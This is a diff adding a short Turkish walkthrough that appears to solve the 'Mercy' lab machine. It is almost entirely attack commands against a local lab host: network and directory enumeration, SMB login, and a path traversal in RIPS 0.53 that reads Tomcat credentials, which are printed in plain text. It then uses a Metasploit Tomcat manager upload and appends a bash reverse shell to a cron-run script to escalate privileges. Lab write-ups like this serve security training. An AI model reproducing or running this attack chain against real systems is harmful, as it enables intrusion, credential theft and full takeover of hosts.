@@ -1,0 +1,22 @@
+MERCY MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.127 bulundu.
+2 - nmap -A 192.168.2.127
+3 - gobuster dir -u http://192.168.2.127:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://192.168.2.127:8080/robots.txt
+5 - http://192.168.2.127:8080/tryharder/tryharder
+6 - echo "hash" | base64 -d
+7 - smbclient -L //192.168.2.127
+8 - smbclient //192.168.2.127/qiu -U qiu, password
+9 - get config, cat config, openHTTP = 159, 27391, 4
+10 - nmap -r -p 159 192.168.2.127
+11 - nmap -r -p 27391 192.168.2.127
+12 - nmap -r -p 4 192.168.2.127
+13 - gobuster dir -u http://192.168.2.127 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+14 - http://192.168.2.127/nomercy
+15 - searchsploit 'rips 0.53'
+16 - searchsploit -m 18660
+17 - http://192.168.2.127/nomercy/windows/code.php?file=../../../../../../var/lib/tomcat7/conf/tomcat-users.xml, thisisasuperduperlonguser : heartbreakisinevitable, fluffy : freakishfluffybunny
+18 - msfconsole, use exploit/multi/http/tomcat_mgr_upload
+19 - cd /home/fluffy/.private/secrets
+20 - echo "bash -i >& /dev/tcp/192.168.2.128/4445 0>&1" >> timeclock
+21 - whoami
